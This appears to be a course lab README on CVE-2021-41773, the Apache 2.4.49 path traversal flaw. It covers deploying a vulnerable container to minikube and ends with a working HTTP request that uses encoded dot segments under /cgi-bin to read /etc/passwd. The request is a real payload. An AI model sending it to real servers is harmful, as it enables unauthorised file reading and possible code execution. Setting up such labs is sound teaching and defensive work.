# CVE-2021-41773

A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions. The fix in Apache HTTP Server 2.4.50 was found to be incomplete, see CVE-2021-42013.
## PoC 

The PoC from itsecurityco's [PoC repository](https://github.com/itsecurityco/CVE-2021-41773)

## Setup and Demo

The image namzoyatuk/httpd-cve5 built by Dockerfile provided in the [PoC repository](https://github.com/itsecurityco/CVE-2021-41773).

Deployment to Kubernetes can be done by executing below commands:

```
kubectl apply -f deployment.yaml
kubectl apply -f service.yaml
```
We can see the pod and service are up and running
![image](https://github.com/turkbera/Ceng489-Kuberenetes-Attack-Scenarios/assets/54873326/9ba9a4a7-bb56-4ffa-b239-468067655daf)

![image](https://github.com/turkbera/Ceng489-Kuberenetes-Attack-Scenarios/assets/54873326/b4e74c06-b3d3-4362-8c38-fba5575accc1)

The result of the `minikube ip` command:

![image](https://github.com/turkbera/Ceng489-Kuberenetes-Attack-Scenarios/assets/54873326/36af3403-97ca-48fc-9d99-47bcaa9803e3)


In order to exploit the application send following request
```
GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1
Host: <minikubeip>:<NodePort>
User-Agent: Mozilla
Connection: close
```


![image](https://github.com/turkbera/Ceng489-Kuberenetes-Attack-Scenarios/assets/54873326/a254ef31-a54f-4805-b5af-6c9326925ed6)


